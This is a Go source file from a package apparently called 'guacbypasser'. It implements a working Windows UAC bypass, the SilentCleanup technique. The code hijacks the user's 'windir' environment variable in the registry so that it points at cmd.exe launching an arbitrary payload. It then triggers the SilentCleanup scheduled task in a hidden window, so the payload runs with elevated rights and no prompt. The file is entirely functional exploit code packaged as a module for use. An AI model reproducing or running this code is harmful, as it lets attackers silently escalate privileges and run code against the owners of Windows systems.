package guacbypasser

import (
	"fmt"
	"path/filepath"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

func w32_nt_once_silentCleanup(p string) (error, Informer) {
	inf := Informer{
		Name: "SilentCleanup",
		Desc: "Bypass UAC using silentcleanup and registry key manipulation",
		Id:   9,

		Type:   "Once",
		Module: "w32_nt_once_silentCleanup",

		Fixed:   false,
		FixedIn: "",

		Admin:   false,
		Payload: true,
	}

	fPath, err := filepath.Abs(p)
	if err != nil {
		return err, inf
	}
	cmdN := fmt.Sprintf("%s /k start %s", `C:\Windows\System32\cmd.exe`, fPath)

	if _, _, err = registry.CreateKey(
		registry.CURRENT_USER, `Environment`,
		registry.SET_VALUE); err != nil {

		return err, inf
	}
	wk32, err := registry.OpenKey(
		registry.CURRENT_USER, `Environment`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	defer wk32.Close()
	if err != nil {
		return err, inf
	}
	if err := wk32.SetStringValue("windir", cmdN); err != nil {
		return err, inf
	}
	time.Sleep(2 * time.Second)

	cmd := newCmd("schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I")
	cmd.exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if _, err = cmd.exec.Output(); err != nil {
		return err, inf
	}
	return nil, inf
}

// NewOnceSilentCleanup #add-some-info-please
func NewOnceSilentCleanup(p string) (error, Informer) { return w32_nt_once_silentCleanup(p) }
